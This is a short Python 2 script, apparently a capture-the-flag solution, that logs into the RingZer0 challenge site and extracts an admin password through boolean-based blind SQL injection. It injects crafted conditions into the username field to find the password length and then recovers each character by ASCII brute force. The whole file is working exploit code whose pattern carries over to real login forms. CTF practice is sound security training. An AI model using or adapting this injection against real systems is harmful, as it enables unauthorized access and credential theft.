import requests

login_url = 'https://ringzer0team.com/login'
target_url = 'https://ringzer0team.com/challenges/5'

data = {'username': 'zwhubuntu', 'password': '************************'}
password = ''

s = requests.session()
r = s.post(login_url, data=data)
if 'zwhubuntu' in r.text:
    print 'login successfully!'

for i in xrange(40):
    payload = "adminaaaaaa' or length(password)=%s and '1" % i
    data = {'username': payload, 'password': password}
    r = s.post(target_url, data=data)
    if 'Invalid' in r.text:
        print "the password length is %s" % i
        break
# length = 15

for i in range(1, 16):
    for j in range(32, 128):
        payload_passwd = "adminaaaaaa' or ascii(substring(password,%s,1))=%s and '1" % (i, j)
        data = {'username': payload_passwd, 'password': '1'}
        r = s.post(target_url, data=data)
        if 'Invalid' in r.text:
            password += chr(j)
            print 'password is %s' % password
            break
